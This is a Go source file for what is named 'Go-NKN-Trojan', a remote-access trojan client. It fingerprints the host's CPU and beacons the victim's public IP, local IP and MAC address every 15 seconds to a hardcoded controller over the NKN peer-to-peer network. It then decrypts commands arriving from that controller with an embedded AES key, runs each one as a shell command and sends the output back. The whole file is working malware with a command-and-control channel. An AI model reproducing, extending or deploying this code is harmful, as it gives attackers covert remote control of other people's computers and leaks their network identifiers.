package main

import (
	"Go-NKN-Trojan/Power"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/nknorg/nkn-sdk-go"
	"github.com/shirou/gopsutil/cpu"
	"time"
)

func main() {
	controlid := "monitor.7d161a601aeb345949ac31510bc61491bd81cb45a7fe53d919706adbd96e6eb0"
	seedstr := InitialSeed()
	Start(seedstr, controlid)
}

func Start(seedstr string, controlid string) {
	seedhex, _ := hex.DecodeString(seedstr)
	account, _ := nkn.NewAccount(seedhex)
	goalip := Power.GetWANIP() + "|" + Power.GetLANIP() + "|" + Power.GetMacAddr()
	Starter, _ := nkn.NewMultiClient(account, seedstr[0:4], 4, false, nknconfig)
	<-Starter.OnConnect.C
	go func() {
		for {
			_, _ = Starter.Send(nkn.NewStringArray(controlid), goalip, nil)
			time.Sleep(15 * time.Second)
		}
	}()
	for {
		msg := <-Starter.OnMessage.C
		if AesDecode(string(msg.Data)) != "error" {
			err := msg.Reply(Runcommand(AesDecode(string(msg.Data))))
			if err != nil {
				return
			}
		}
	}
}

func InitialSeed() string {
	infos, _ := cpu.Info()
	var data []uint8
	for _, info := range infos {
		data, _ = json.MarshalIndent(info, "", " ")
	}
	cpumd5 := md5.Sum(data)
	seed := fmt.Sprintf("%x%x", cpumd5, cpumd5)
	return seed
}

func AesDecode(str string) string {
	plaintext, err := Power.AesCbcDecrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return "error"
	} else {
		return string(plaintext)
	}
}

func Runcommand(cmd string) string {
	_, out, _ := Power.NewCommand().Exec(cmd)
	return out
}

var nknconfig *nkn.ClientConfig

func init() {
	nknconfig = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              409600,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}
